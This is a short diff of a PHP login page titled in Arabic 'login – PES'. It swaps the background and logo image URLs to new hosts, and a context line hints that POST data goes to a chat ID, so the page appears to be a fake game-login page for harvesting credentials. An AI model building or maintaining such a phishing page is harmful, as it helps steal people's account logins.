@@ -49,7 +49,7 @@ if ($CHAT_ID && $_SERVER['REQUEST_METHOD'] === 'POST') {
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: url('https://dev-ianstagram.pantheonsite.io/wp-content/uploads/2025/08/Screenshot_20250827_194736_Google.jpg') no-repeat center center fixed;
+      background: url('https://i.ibb.co/VWbRXkCp/Screenshot-20260411-002429-Google.jpg') no-repeat center center fixed;
       background-size: cover;
       margin: 0; padding: 0;
       display: flex; justify-content: center; align-items: center;
@@ -79,7 +79,7 @@ if ($CHAT_ID && $_SERVER['REQUEST_METHOD'] === 'POST') {
 <body>
   <div class="container">
     <div class="logo">
-      <img src="https://dev-ianstagram.pantheonsite.io/wp-content/uploads/2025/08/Screenshot_20250827_194900_Google.jpg" alt="PES Logo">
+      <img src="https://i.ibb.co/0VVL9R00/Screenshot-20260411-002200-Google.jpg" alt="PES Logo">
     </div>
     <h2>تسجيل دخول - PES</h2>
     <form id="loginForm" method="post">
